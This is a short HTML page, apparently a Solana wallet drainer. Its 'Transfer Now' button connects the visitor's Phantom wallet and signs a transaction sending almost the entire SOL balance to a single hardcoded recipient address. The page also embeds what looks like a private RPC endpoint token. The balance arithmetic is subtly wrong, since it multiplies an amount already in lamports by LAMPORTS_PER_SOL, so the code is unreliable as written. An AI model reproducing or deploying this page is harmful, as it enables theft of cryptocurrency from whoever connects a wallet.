<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Transfer</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.76.0/solanaWeb3.min.js"></script>
</head>
<body>
    <h2>Click below to transfer all funds</h2>
    <button id="transferButton">Transfer Now</button>

    <script>
        document.getElementById('transferButton').addEventListener('click', async () => {
            if (!window.solana) {
                alert("Phantom wallet not found. Please install the Phantom extension or mobile app.");
                return;
            }

            try {
                // Connect to Phantom wallet
                const provider = window.solana;
                await provider.connect();

                const connection = new solanaWeb3.Connection(
                    "https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df",
                    'confirmed'
                );

                const publicKey = provider.publicKey;

                if (!publicKey) {
                    alert("Wallet connection failed. Please try again.");
                    return;
                }

                // Get wallet balance
                let balance = await connection.getBalance(publicKey);
                balance = solanaWeb3.LAMPORTS_PER_SOL * balance;

                if (balance <= 0) {
                    alert("Insufficient SOL balance.");
                    return;
                }

                // Transfer entire balance
                const recipient = new solanaWeb3.PublicKey('9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf');
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: recipient,
                        lamports: balance - 5000, // Reserve some SOL for transaction fee
                    })
                );

                // Send transaction
                const signature = await provider.signAndSendTransaction(transaction);
                await connection.confirmTransaction(signature, 'confirmed');

                alert("Transaction successful! Signature: " + signature);
            } catch (error) {
                alert("Transaction failed: " + error.message);
            }
        });
    </script>
</body>
</html>
